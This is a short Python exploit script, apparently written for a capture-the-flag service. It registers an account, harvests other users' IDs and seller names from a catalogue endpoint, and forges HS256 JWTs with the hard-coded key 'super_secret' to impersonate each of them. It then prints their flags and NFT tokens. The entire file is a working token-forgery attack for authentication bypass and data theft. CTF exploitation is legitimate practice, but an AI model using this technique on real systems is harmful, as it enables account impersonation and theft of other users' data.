#!/usr/bin/env python3
import requests
from datetime import datetime, timedelta
import sys
import jwt

HOST = sys.argv[1]
PORT = '8080'
hint = sys.argv[2]
URL = f'http://{HOST}:{PORT}'

with requests.Session() as s:
    user = {"username" : hint, "password" : "hacker_password"}
    s.post(f'{URL}/api/v1/register', json=user)
    s.post(f'{URL}/api/v1/login', json=user)
    resp = s.post(f'{URL}/api/v1/catalogue', json={"page": 1, "limit" : 5})
with requests.Session() as s2: 
    role = "user" #default
    for m in resp.json()["rows"]:
        exp = int((datetime.now() + timedelta(minutes = 10)).timestamp())
        encoded_jwt = jwt.encode({"ID": m["user_id"], "role": role, "sub":m["seller"], "exp":exp}, "super_secret", algorithm="HS256")
        s2.cookies.set("token",encoded_jwt)
        s.post(f'{URL}/api/v1/login', json=user)
        resp = s2.get(f'{URL}/api/v1/profile')
        print(resp.json()["flag"])
        for i in resp.json()["merchandise"]:  
            print(i['NFTToken'])